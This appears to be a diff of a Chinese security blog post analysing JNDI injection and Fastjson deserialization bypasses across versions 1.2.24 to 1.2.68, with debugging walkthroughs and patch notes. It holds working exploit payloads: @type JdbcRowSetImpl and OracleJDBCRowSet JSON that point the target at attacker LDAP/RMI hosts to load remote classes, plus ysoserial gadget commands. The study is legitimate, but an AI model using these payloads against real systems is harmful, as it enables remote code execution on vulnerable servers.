1.2.48补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-Fastjson-1-2-51%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x09 Fastjson 1.2.51漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-fastjson-1-2-68-%E7%BB%95%E8%BF%87autotype"><span class="toc-text">0x11 fastjson 1.2.68 绕过autotype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-dnslog%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x11 dnslog判断是否存在fastjson 反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-%E9%98%B2%E5%BE%A1%E5%BA%94%E6%80%A5"><span class="toc-text">0x12 防御应急</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93"><span class="toc-text">0x13 简单总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">0x14 参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -720,14 +782,26 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
+        <h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JNDI:是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源，JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p>
+<p>常用于攻击的两种协议：</p>
+<p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
 <p>LADP利用JDK版本≤ 6u211 、7u201、8u191之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址</p>
 <p><img src="https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png" alt="img"></p>
-<h2 id="readObject攻击RMI"><a href="#readObject攻击RMI" class="headerlink" title="readObject攻击RMI"></a>readObject攻击RMI</h2><p>环境：</p>
-<p> 服务端JDK版本为 JDK1.7u21 服务端</p>
-<p>存在 Commons-Collections3.1 或其他可利⽤组件。</p>
+<p> 在JNDI中提供了绑定和查找的方法：</p>
+<ul>
+<li>bind：将名称绑定到对象中；</li>
+<li>lookup：通过名字检索执行的对象；</li>
+</ul>
+<h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>Reference类表示对存在于命名/目录系统以外的对象的引用,存在于服务端，客户端访问服务端，会去寻找Reference中指定的类，如果查找不到则会在Reference中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行。</p>
+<p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p>
+<p>几个比较关键的属性：</p>
+<ul>
+<li>className：远程加载时所使用的类名；</li>
+<li>classFactory：加载的class中需要实例化类的名称；</li>
+<li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li>
+</ul>
 <h2 id="0x01-JNDI-RMI"><a href="#0x01-JNDI-RMI" class="headerlink" title="0x01 JNDI+RMI"></a>0x01 JNDI+RMI</h2><p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214104500479.png" alt="image-20211214104500479"></p>
-<h2 id="0x02-JNDI-LDAP"><a href="#0x02-JNDI-LDAP" class="headerlink" title="0x02 JNDI+LDAP"></a>0x02 JNDI+LDAP</h2><p>com.sun.jndi.ldap.object.trustURLCodebase 为 true ， JDK 11.0.1 、 8u191 、 7u201 、 6u211 开始默认为 false ，测试环境为 java version “1.8.0_112” 。</p>
+<h2 id="0x02-JNDI-LDAP"><a href="#0x02-JNDI-LDAP" class="headerlink" title="0x02 JNDI+LDAP"></a>0x02 JNDI+LDAP</h2><p>com.sun.jndi.ldap.object.trustURLCodebase 为 true ， JDK 11.0.1 、 8u191 、 7u201 、 6u211 开始默认为 false 。</p>
 <p>实验版本：</p>
 <p>jdk 8.u102</p>
 <p>恶意类：</p>
@@ -761,11 +835,17 @@ public class POC &#123;
 &#125;
 </code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214102617832.png" alt="image-20211214102617832"></p>
-<h2 id="0x03-JNDI-注入利用-Bypass-高版本-JDK-限制"><a href="#0x03-JNDI-注入利用-Bypass-高版本-JDK-限制" class="headerlink" title="0x03 JNDI 注入利用 Bypass 高版本 JDK 限制"></a>0x03 JNDI 注入利用 Bypass 高版本 JDK 限制</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>NDI 注入利用非常广泛但是在高版本 JDK 中由于默认 codebase 为 true 从而导致客户端默认不会请求远程Server上的恶意 Class。本文主要学习 KINGX 师傅所提出的两种 Bypass 的方法</p>
+<p>简单分析：</p>
+<p>方法栈</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226144301531.png" alt="image-20211226144301531"></p>
+<p>NamingManager#getObjectFactoryFromReference</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226144535729.png" alt="image-20211226144535729"></p>
+<p>调用类加载器，去codebase上加载factoryName这个类。</p>
+<h2 id="0x03-JNDI-注入利用-Bypass-高版本-JDK-限制"><a href="#0x03-JNDI-注入利用-Bypass-高版本-JDK-限制" class="headerlink" title="0x03 JNDI 注入利用 Bypass 高版本 JDK 限制"></a>0x03 JNDI 注入利用 Bypass 高版本 JDK 限制</h2><h3 id="3-1前言："><a href="#3-1前言：" class="headerlink" title="3.1前言："></a>3.1前言：</h3><p>NDI 注入利用非常广泛但是在高版本 JDK 中由于默认 codebase 为 true 从而导致客户端默认不会请求远程Server上的恶意 Class。本文主要学习 KINGX 师傅所提出的两种 Bypass 的方法</p>
 <p>KINGX 师傅文章链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p>
 <p>RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true</p>
 <p>LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true</p>
-<h3 id="3-1-Bypass1：返回序列化Payload，触发本地Gadget"><a href="#3-1-Bypass1：返回序列化Payload，触发本地Gadget" class="headerlink" title="3.1 Bypass1：返回序列化Payload，触发本地Gadget"></a>3.1 Bypass1：返回序列化Payload，触发本地Gadget</h3><p>原理：当我们开启一个恶意的 Server 并控制返回的数据，由于返回的数据是序列化的，然后利用本地的Gadget，比如CommonsCollections链，然后可以结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用。</p>
+<h3 id="3-2-Bypass1：返回序列化Payload，触发本地Gadget"><a href="#3-2-Bypass1：返回序列化Payload，触发本地Gadget" class="headerlink" title="3.2 Bypass1：返回序列化Payload，触发本地Gadget"></a>3.2 Bypass1：返回序列化Payload，触发本地Gadget</h3><p>原理：当我们开启一个恶意的 Server 并控制返回的数据，由于返回的数据是序列化的，然后利用本地的Gadget，比如CommonsCollections链，然后可以结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用。</p>
 <p>JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：</p>
 <ul>
 <li>Java序列化</li>
@@ -777,7 +857,8 @@ public class POC &#123;
 <li>javaFactory</li>
 <li>javaSerializedData</li>
 </ul>
-<h4 id="Evil-LDAP-Server"><a href="#Evil-LDAP-Server" class="headerlink" title="Evil LDAP Server"></a>Evil LDAP Server</h4><pre><code class="java">/**
+<p>Evil LDAP Server</p>
+<pre><code class="java">/**
  * In this case
  * Server return Serialize Payload, such as CommonsCollections
  * if Client&#39;s ClassPath exists lib which is vulnerability version So We can use it
@@ -851,11 +932,12 @@ public class HackerLdapServer &#123;
 <p>代码和环境可以直接使用kxcode师傅的：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</a></p>
 <p>将代码进行打包成jar包，然后开启LDAP和http服务：</p>
-<pre><code class="java">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;|base64
+<pre><code class="java">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#39;calc&#39;|base64
 </code></pre>
 <pre><code>java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  0.0.0.0 8088 1389
 </code></pre>
-<h4 id="Victim-Client"><a href="#Victim-Client" class="headerlink" title="Victim Client"></a>Victim Client</h4><pre><code class="java">package JNDI.LocalGadgetBypass.Client;
+<p>Victim Client</p>
+<pre><code class="java">package JNDI.LocalGadgetBypass.Client;
 
 import javax.naming.Context;
 import javax.naming.InitialContext;
@@ -944,18 +1026,22 @@ public class VictimClient &#123;
 <pre><code class="java">RefAddr var17 = (RefAddr)deserializeObject(var13.decodeBuffer(var6.substring(var19)), var14);
 var15.setElementAt(var17, var12);
 </code></pre>
-<h3 id="3-2-Bypass-2：利用本地Class作为Reference-Factory"><a href="#3-2-Bypass-2：利用本地Class作为Reference-Factory" class="headerlink" title="3.2  Bypass 2：利用本地Class作为Reference Factory"></a>3.2  Bypass 2：利用本地Class作为Reference Factory</h3><h2 id="0x04-Fastjson1-2-24-JDNI注入"><a href="#0x04-Fastjson1-2-24-JDNI注入" class="headerlink" title="0x04 Fastjson1.2.24 + JDNI注入"></a>0x04 Fastjson1.2.24 + JDNI注入</h2><p>前言</p>
+<h3 id="3-3-Bypass-2：利用本地Class作为Reference-Factory"><a href="#3-3-Bypass-2：利用本地Class作为Reference-Factory" class="headerlink" title="3.3  Bypass 2：利用本地Class作为Reference Factory"></a>3.3  Bypass 2：利用本地Class作为Reference Factory</h3><p>后续再进行分析。</p>
+<h2 id="0x04-Fastjson1-2-24-JDNI注入"><a href="#0x04-Fastjson1-2-24-JDNI注入" class="headerlink" title="0x04 Fastjson1.2.24 + JDNI注入"></a>0x04 Fastjson1.2.24 + JDNI注入</h2><p>前言</p>
+<p>本文章使用的pyload均是JDNI注入，其他两种利用链一般用于打不出网的服务器。</p>
 <p>利⽤条件：<br>需要连接远程恶意服务器，在⽬标没外⽹的情况下⽆法直接利⽤<br>JNDI注⼊利⽤链是通⽤性较强的利⽤⽅式，在以下三种反序列化中均可使⽤：</p>
 <pre><code>parse(jsonStr)
 parseObject(jsonStr)
 parseObject(jsonStr,Object.class)
 </code></pre>
-<p>当然JDK版本有特殊需求，详情参考JAVA安全之JNDI注⼊：<br>RMI利⽤的JDK版本≤ JDK 6u132、7u122、8u113<br>LDAP利⽤JDK版本≤ 6u211 、7u201、8u191</p>
+<p>漏洞原理：</p>
+<p>fastjson是根据json内容转为对应的javabean，即fastjson会取得json中的类及类的参数进行反序列化，由于json可控，攻击者可以自定义类及类的参数，所以fastjson在获取攻击者传入的对象的set、get方法时会根据攻击者传入的json来进行设定set方法的值，最后在反序列化时触发漏洞。拿jndi注入来说，攻击者传入json内容<code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.52.132:1389/Exploit\&quot;,&quot;autoCommit&quot;:true&#125;</code>，fastjson首先会取得JdbcRowSetImpl类，在取JdbcRowSetImpl类的所有set、get方法时会将数据源ldap://192.168.52.132:1389/Exploit当作setDataSourceName的值来设定，最后在还原成JdbcRowSetImpl时会调用setAutoCommit方法中的connect方法，再去调用lookup方法， 导致去加载远程恶意类达到攻击目的。</p>
 <p>影响版本：<br>Fastjson 1.2.22-1.2.24</p>
 <p>利⽤环境：<br>jdk 1.8.0_102、fastjson1.2.24</p>
 <p>pyload：</p>
-<p>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}</p>
-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223142229621.png" alt="image-20211223142229621"></p>
+<p>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}</p>
+<p>@type：指定的解析类，这⾥即&quot;com.sun.rowset.JdbcRowSetImpl&quot;，Fastjson根据指定类去反序列化得到该类的实例</p>
+<p>dataSourceName：RMI注册中⼼绑定恶意服务<br>autoCommit：在Fastjson JdbcRowSetImpl链中反序列化时，会去调⽤setAutoCommit⽅法，这个方法中有lookup方法，才导致去远程的codebase加载恶意的类。</p>
 <p>4.1     LDAP+JdbcRowSetImpl</p>
 <p>恶意类，需要代码编译成class文件然后挂在到web服务器中，也就是python起的服务的目录。</p>
 <pre><code>public class Exploit &#123;
@@ -992,6 +1078,7 @@ public class JdbcRowSetImplPoc &#123;
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214112824417.png" alt="image-20211214112824417"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214112839559.png" alt="image-20211214112839559"></p>
 <p>运行服务器上的POC，成功弹出计算器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226145721749.png" alt="image-20211226145721749"></p>
 <p>踩坑记录：</p>
 <p>报错Caused <strong>by</strong>: java.lang.NoClassDefFoundError: Exploit1 (wrong name: xxx)</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211213174531937.png" alt="image-20211213174531937"></p>
@@ -999,7 +1086,7 @@ public class JdbcRowSetImplPoc &#123;
 <p> 删去package，并使用java命令行编译</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211213174655253.png" alt="image-20211213174655253"></p>
 <p>这个问题折磨了我半天时间……,一开始以为是jdk版本问题。</p>
-<p>1.3 RMI+JdbcRowSetImpl</p>
+<p>4.2 RMI+JdbcRowSetImpl</p>
 <p><strong>Poc</strong></p>
 <pre><code>import com.alibaba.fastjson.JSON;
 import com.sun.rowset.JdbcRowSetImpl;
@@ -1054,9 +1141,29 @@ public class EvilObject &#123;
 <p>python -m http.server 8000</p>
 <p>运行POC：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221163039933.png" alt="image-20211221163039933"></p>
+<p>4.3 调试分析：</p>
+<p>从入口开始调试</p>
+<p>JSON#parse</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226160612959.png" alt="image-20211226160612959"></p>
+<p>跟进DefaultJSONparser的parse方法</p>
+<p>DefaultJSONparser#parse</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226160849226.png" alt="image-20211226160849226"></p>
+<p>DefaultJSONparser#parserObject</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226154121901.png" alt="image-20211226154121901"></p>
+<p>添加com.sun.rowset.JdbcRowSetImpl 类到mapping集合中。将com.sun.rowset.JdbcRowSetImpl 类赋值给clazz并返回。</p>
+<p>DefaultJSONparser#parserObject</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226154648926.png" alt="image-20211226154648926"></p>
+<p>调用了deserializer.deserialze方法进行反序列化，这个反序列化器是JavaBean反序列化器。Fastjson在反序列化时会调⽤⽬标类的setter⽅法，而这里的setter方法就是我们设置的(autoCommit&quot;:true)，所以这里调用的是setautoCommit方法。</p>
+<p>JdbcRowsetImpl#setAutoCommit</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226155038303.png" alt="image-20211226155038303"></p>
+<p>跟进connect方法</p>
+<p>JdbcRowsetImpl#connect</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211226155105469.png" alt="image-20211226155105469"></p>
+<p>调用了lookup，可以看到这⾥的lookup中传⼊了 this.getDataSourceName() ，返回dataSource变量内容，⽽这个dataSource内容则是在前⾯ setDataSourceName ⽅法中进⾏设置的，该参数是可控的，也就是我们传⼊的 dataSourceName的值（恶意的jndi服务器的恶意类），所以可以进⾏JDNI注⼊从⽽达到命令执⾏。</p>
 <h2 id="0x05-Fastjson1-2-25改动"><a href="#0x05-Fastjson1-2-25改动" class="headerlink" title="0x05 Fastjson1.2.25改动"></a>0x05 Fastjson1.2.25改动</h2><p>Fastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。</p>
 <p>1.AutoTypeSupport</p>
-<p>True的时候，开启AutoType功能。</p>
+<p>True的时候，先经过白名单，白名单默认空的，再经过黑名单，如果黑白名单都检测不通过，则抛出异常。</p>
+<p>Flase的时候，先经过黑名单，如果黑名单检测不通过，则直接抛出异常，然后再经过白名单。如果黑白名单都检测不通过，则抛出异常。</p>
 <p>2.checkAutotype安全机制</p>
 <pre><code>public class demo &#123;
     public static void main(String[] args) &#123;
@@ -1089,13 +1196,13 @@ public class EvilObject &#123;
 &#125;
 </code></pre>
 <p>6.2 源码分析，主要分析为啥要前后加L和;</p>
-<p>因为现在@Type是LLcom.sun.rowset.JdbcRowSetImpl;，自然不会被黑名单进行过滤拦截，但成功通过黑白名单过滤后，程序接下来会通过TypeUtils.loadClass方法对类进行加载</p>
+<p>因为现在@Type是”Lcom.sun.rowset.JdbcRowSetImpl”;，自然不会被黑名单进行过滤拦截，但成功通过黑白名单过滤后，程序接下来会通过TypeUtils.loadClass方法对类进行加载</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222152011346.png" alt="image-20211222152011346"></p>
 <p>跟进TypeUtils.loadClass方法</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222152358812.png" alt="image-20211222152358812"></p>
 <p>方框里就是本次最重要的代码了，我们要分析下，为什么fastjson要编写这两段代码？</p>
 <p>这两段代码是对Lcom.sun.rowset.JdbcRowSetImpl;进行过滤，第一段去除[，第二段去除首位的L和最后位的;。</p>
-<p>要明白为什么要编写这两处if语句，需要认识一下JNI字段描述符</p>
+<p>要明白为什么要编写这两处if语句，需要认识一下JNI字段描述符。</p>
 <p>6.3  JNI字段描述符</p>
 <p>”[LAutoTypeTest.ForTest;”这种类型的字符串其实是一种对函数返回值和参数的编码，名为JNI字段描述符（JavaNative Interface FieldDescriptors)。</p>
 <p>AutoTypeTest.ForTest类的Class对象名为”AutoTypeTest.ForTest”；为了区分，AutoTypeTest.ForTest类的数组类型的Class对象名则为”[LAutoTypeTest.ForTest;”这样的形式。</p>
@@ -1139,7 +1246,7 @@ public class EvilObject &#123;
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222151641106.png" alt="image-20211222151641106"></p>
 <h2 id="0x08-Fastjson-1-2-47漏洞分析"><a href="#0x08-Fastjson-1-2-47漏洞分析" class="headerlink" title="0x08 Fastjson 1.2.47漏洞分析"></a>0x08 Fastjson 1.2.47漏洞分析</h2><p>影响版本：</p>
 <ul>
-<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用（因为未开启AutoTypeSupport，所以就不会进入黑白名单判断的逻辑）</li>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li>
 <li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li>
 </ul>
 <p>利⽤环境：<br>jdk 1.8.0_102、fastjson1.2.47</p>
@@ -1158,7 +1265,7 @@ public class EvilObject &#123;
 </code></pre>
 <p>8.2 源码分析</p>
 <p>1.2.47漏洞利用分析还是挺难的，看不懂的建议跟着调试然后多看一遍。</p>
-<p>先说下漏洞原理：通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。</p>
+<p>先说下漏洞原理：通过java.lang.Class绕过黑白名单安全机制，将JdbcRowSetImpl类加载到Mapping集合中缓存。</p>
 <h3 id="第一种情况：1-2-33-1-2-47版本：无论是否开启AutoTypeSupport，都能成功利用"><a href="#第一种情况：1-2-33-1-2-47版本：无论是否开启AutoTypeSupport，都能成功利用" class="headerlink" title="第一种情况：1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用"></a>第一种情况：1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</h3><p>为什么要先分析这种情况呢，因为这个思路很好很喵，看完这种情况，其实第二种情况就特别简单了。</p>
 <h4 id="分析第一个json字符串-quot-type-quot-quot-java-lang-Class-quot-quot-val-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot"><a href="#分析第一个json字符串-quot-type-quot-quot-java-lang-Class-quot-quot-val-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot" class="headerlink" title="分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}"></a>分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</h4><p>我们先跟进ParserConfig#checkAutoType，还是老样子前面代码还是使用黑白名单进行过滤，这里不重复进行分析，直接看949行。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211222174955337.png" alt="image-20211222174955337"></p>
@@ -1221,49 +1328,118 @@ public class EvilObject &#123;
 <p>mapping.put  添加恶意类到mapping集合中</p>
 <p>…….</p>
 <h2 id="第二种情况：1-2-25-1-2-32版本：未开启AutoTypeSupport时能成功利用"><a href="#第二种情况：1-2-25-1-2-32版本：未开启AutoTypeSupport时能成功利用" class="headerlink" title="第二种情况：1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用"></a>第二种情况：1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用</h2><p>我们之间看代码有区别的部分</p>
+<p>分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</p>
+<p>这里不一样的地方是，不开启AutoTypeSupport的话，由于&quot;java.lang.Class&quot;在bucktes集合中存在。导致不会经过黑白名单机制，提前跳出安全机制。然后把”com.sun.rowset.JdbcRowSetImpl”加入到mapping集合中。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227094112733.png" alt="image-20211227094112733"></p>
+<p>分析第二个json字符串{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.52.132:1389/Exploit&quot;,&quot;autoCommit&quot;:true}</p>
+<p>mapping中存在”com.sun.rowset.JdbcRowSetImpl”,返回一个clazz。可以看到832行进入if语句后直接返回了clazz。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227093603374.png" alt="image-20211227093603374"></p>
+<p>那就有疑问了，为啥开启AutoTypeSupport就不能利用了。因为开启AutoTypeSupport，会进入白名单后进入黑名单。</p>
+<p>重点就是第二个字符串，大家可以看下图，是不是发现了少了一个if判断语句。</p>
+<p>让我们来看下对比图：</p>
 <p>Fastjson1.2.32#ParserConfig#checkAutotype</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224142849934.png" alt="image-20211224142849934"></p>
-<p>分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</p>
-<p>还是一样，会通过黑白名单，并把com.sun.rowset.JdbcRowSetImpl加入到mapping集合中</p>
-<p>分析第二个json字符串{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.52.132:1389/Exploit&quot;,&quot;autoCommit&quot;:true}</p>
-<p>重点就是第二个字符串，大家可以看上图，是不是发现了少了一个if判断语句</p>
-<p>让我们来看下对比图：</p>
 <p>Fastjson1.2.47#ParserConfig#checkAutotype</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223143209991.png" alt="image-20211223143209991"></p>
-<p>正是因为1.2.33版本之后新增了一个if逻辑语句，导致当mapping中有我们传进去的className的时候。就不会抛出异常。所以1.2.33版本之前的就会抛出异常。所以不能开启AutoTypeSupport功能。但不开启AutoTypeSupport功能的时候，是不会进入黑名单过滤的，才导致的绕过。</p>
-<h2 id="0x09-1-2-48补丁分析"><a href="#0x09-1-2-48补丁分析" class="headerlink" title="0x09 1.2.48补丁分析"></a>0x09 1.2.48补丁分析</h2><p>在loadClass时，将缓存开关默认设置为False，所以就不会通过缓存的判断。同时将Class类加入黑名单。</p>
+<p>正是因为1.2.33版本之后新增了一个if逻辑语句，导致当mapping中有我们传进去的className的时候。就不会抛出异常。所以1.2.33版本之前的如果开启黑名单安全机制，那就会抛出异常。所以不能开启AutoTypeSupport功能。但不开启AutoTypeSupport功能的时候，是不会进入黑名单过滤的，才导致的绕过。</p>
+<h2 id="0x09-1-2-48补丁分析"><a href="#0x09-1-2-48补丁分析" class="headerlink" title="0x09 1.2.48补丁分析"></a>0x09 1.2.48补丁分析</h2><p>在loadClass时，将缓存开关默认设置为False，所以就不会通过缓存的判断。同时将java.lang.Class类加入黑名单。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223150747117.png" alt="image-20211223150747117"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211223150828428.png" alt="image-20211223150828428"></p>
-<h2 id="0x10-fastjson-1-2-68-绕过autotype"><a href="#0x10-fastjson-1-2-68-绕过autotype" class="headerlink" title="0x10 fastjson 1.2.68 绕过autotype"></a>0x10 fastjson 1.2.68 绕过autotype</h2><p>影响版本：<br>Fastjson &lt;= 1.2.68</p>
-<p>利⽤环境：<br>jdk 1.8.0_102、fastjson1.2.68</p>
-<p>7.1 demo</p>
-<pre><code>import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-
-public class poc &#123;
-    public static void main(String[] args) &#123;
-        String comment = &quot;&#123;\&quot;x\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.openqa.selenium.WebDriverException\&quot;&#125;,\&quot;content\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$x.systemInformation\&quot;&#125;&#125;&quot;;
-        JSONObject jsonObject = JSON.parseObject(comment);
-        System.out.printf(jsonObject.getString(&quot;content&quot;));
-    &#125;
-&#125;
+<p><img src="https://c014.cn/blog/java/Fastjson/pics/42.png" alt="img"></p>
+<h2 id="0x09-Fastjson-1-2-51漏洞分析"><a href="#0x09-Fastjson-1-2-51漏洞分析" class="headerlink" title="0x09 Fastjson 1.2.51漏洞分析"></a>0x09 Fastjson 1.2.51漏洞分析</h2><p>前面说到，这个漏洞基本无法使用 JNDI，实际上并不完全是，当 fastjson 小于 1.2.51 时，还是可以通过实现了 RowSet 接口的类进行 JNDI 反序列化。</p>
+<p><img src="https://static.b1ue.cn/usr/uploads/2020/06/490725217.jpg" alt="1591509245(1).jpg"></p>
+<p>经对比，在 1.2.51 版本没有更新任何黑名单，在 1.2.51 时才更新了一个实现了 RowSet 接口的黑名单oracle.jdbc.rowset.OracleJDBCRowSet，所以还是可以通过寻找 RowSet 类 JNDI gadget 打 1.2.51 版本以下的 fastjson。</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;oracle.jdbc.rowset.OracleJDBCRowSet&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:2333/Exploit&quot;,&quot;command&quot;:&quot;a&quot;&#125;
 </code></pre>
-<p>第一个@type 会检测checkautotype,如果直接使用<code>org.openqa.selenium.WebDriverException</code>会触发cheOutType 退出,那就需要绕过checkautoType，作者绕过就是使用了expectClass,设定第一个@type 为<code>java.lang.Exception</code></p>
+<p>不过需要有导入相应的依赖包。</p>
+<h2 id="0x11-fastjson-1-2-68-绕过autotype"><a href="#0x11-fastjson-1-2-68-绕过autotype" class="headerlink" title="0x11 fastjson 1.2.68 绕过autotype"></a>0x11 fastjson 1.2.68 绕过autotype</h2><p>影响版本：<br>Fastjson &lt;= 1.2.68</p>
+<p>利⽤环境：<br>jdk 1.8.0_102、fastjson1.2.68</p>
+<p>利用限制：</p>
+<p>autoTypeSupport为true</p>
+<p>需要引入有危害链的第三方库，比较鸡肋，所以我也没进行深入了解和调试。</p>
+<p><img src="https://c014.cn/blog/java/Fastjson/pics/44.png" alt="img"></p>
+<p>打开<code>safeMode</code>时，<code>@type</code>这个<code>specialkey</code>完全无用，无论白名单和黑名单，都不支持<code>autoType</code></p>
+<pre><code>ParserConfig.getGlobalInstance().setSafeMode(true);
+</code></pre>
+<p>但是这个默认是不开启的</p>
+<p>而这个版本出现了依靠期望类的利用链</p>
